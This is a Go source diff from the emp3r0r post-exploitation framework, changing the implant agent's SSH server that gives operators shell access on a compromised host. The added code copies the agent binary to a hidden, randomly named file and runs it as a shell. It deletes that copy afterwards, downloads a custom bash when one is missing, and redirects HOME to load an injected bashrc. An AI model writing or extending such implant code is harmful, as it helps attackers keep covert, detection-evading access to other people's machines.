@@ -6,10 +6,10 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"strings"
 
 	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -26,8 +26,17 @@ func setWinsize(f *os.File, w, h int) {
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
 func crossPlatformSSHD(shell, port string, args []string) (err error) {
+	// if we're running from loader, elvsh is not available
+	run_from_loader := os.Getenv("LD") == "true"
+	if run_from_loader && shell == "elvsh" {
+		shell = "bash"
+		if !util.IsCommandExist(shell) {
+			shell = "sh"
+		}
+	}
+
 	exe, err := exec.LookPath(shell)
-	if err != nil {
+	if err != nil && shell != "elvsh" {
 		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
 		log.Print(res)
 		return
@@ -40,19 +49,55 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 	}
 
 	ssh_server.Handle(func(s ssh.Session) {
+		// in case agent binary is deleted, elvsh will need a new one
+		new_exe := fmt.Sprintf("%s/.%s", RuntimeConfig.UtilsPath, util.RandStr(22))
+		if shell == "elvsh" {
+			// write process exe again
+			log.Printf("elvsh: rewriting process exe to %s", new_exe)
+			err = CopySelfTo(new_exe)
+			if err != nil {
+				err = fmt.Errorf("%s not found (%v), aborting", exe, err)
+				log.Print(err)
+			}
+			exe = new_exe
+		}
 		cmd := exec.Command(exe, args...)
-		if shell == "bash" && emp3r0r_data.DefaultShell != "/bin/sh" {
+		cmd.Env = os.Environ()
+
+		// we have a special bashrc and we would like to apply it
+		if shell == "bash" {
+			custom_bash := RuntimeConfig.UtilsPath + "/bash"
+			if !util.IsFileExist(custom_bash) {
+				log.Printf("sshd: custom bash not found, downloading...")
+				VaccineHandler()
+			}
 			err = ExtractBash()
 			if err != nil {
 				log.Printf("sshd: extract built-in bash: %v", err)
 			}
-			cmd = exec.Command("/bin/bash")
+			cmd = exec.Command(exe)
 			bash_home := RuntimeConfig.UtilsPath // change home to use our bashrc
 			os.Setenv("HOME", bash_home)
 			os.Setenv("SHELL", cmd.Path)
-			cmd.Env = append(cmd.Env, os.Environ()...)
+			cmd.Env = os.Environ()
 		}
-		log.Printf("sshd execute: %v, env=%s", cmd, cmd.Env)
+
+		// we also have a more special Evlsh
+		if shell == "elvsh" {
+			cmd = exec.Command(exe)
+			cmd.Env = append(os.Environ(), "ELVSH=true")
+		}
+
+		// remove empty arg in cmd.Args
+		var tmp_args []string
+		for _, arg := range cmd.Args {
+			if strings.TrimSpace(arg) != "" {
+				tmp_args = append(tmp_args, arg)
+			}
+		}
+		cmd.Args = tmp_args
+
+		log.Printf("sshd execute: %v, args=%v, env=%s", cmd, cmd.Args, cmd.Env)
 
 		ptyReq, winCh, isPTY := s.Pty()
 		if isPTY {
@@ -69,6 +114,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			log.Print(err)
 			return
 		}
+		os.Remove(new_exe) // clean up our copy as elvsh should be running and it's no longer needed
 
 		go func() {
 			for win := range winCh {
